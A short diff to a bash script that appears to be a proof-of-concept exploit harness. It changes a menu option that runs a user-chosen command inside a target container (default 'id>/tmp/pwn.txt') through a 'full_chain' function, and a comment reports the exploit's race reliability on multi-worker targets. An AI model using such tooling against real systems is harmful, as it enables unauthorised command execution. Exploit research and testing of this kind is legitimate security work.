@@ -82,7 +82,10 @@ action_3() {
   cmd="${cmd:-id>/tmp/pwn.txt}"
   read -r -p "proof file inside the container [/tmp/pwn.txt]: " proof
   proof="${proof:-/tmp/pwn.txt}"
-  full_chain "" "$cmd" "$proof" "$WORSTOCK"
+  # A custom command is what this option is for; the pool is not the interesting variable, and on a
+  # multi-worker target the fire is a pinning race (measured 1/3 on x86-64 against 2/2 single-worker), so
+  # this path uses the one-worker baseline instead of inheriting the stock pool.
+  full_chain "$SINGLE_TAG" "$cmd" "$proof" 0
 }
 
 action_4() {
